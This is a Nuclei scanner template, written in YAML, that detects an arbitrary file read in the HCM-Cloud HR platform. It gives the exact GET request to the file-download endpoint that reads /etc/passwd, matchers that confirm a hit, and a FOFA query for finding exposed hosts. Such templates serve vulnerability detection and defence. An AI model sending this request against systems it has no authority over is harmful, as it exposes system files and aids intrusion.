id: hcm-cloud-arbitrary-file-read

info:
  name: HCM Cloud - Arbitrary File Read
  author: s4e-io
  severity: high
  description: |
    HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.
  reference:
    - https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="-859381597"
  tags: hcm-cloud,lfi

http:
  - raw:
      - |
        GET /api/model_report/file/download?index=/&ext=/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "regex('root:.*:0:0:', body)"
          - 'contains(content_type, "application/octet-stream")'
          - "status_code == 200"
        condition: and
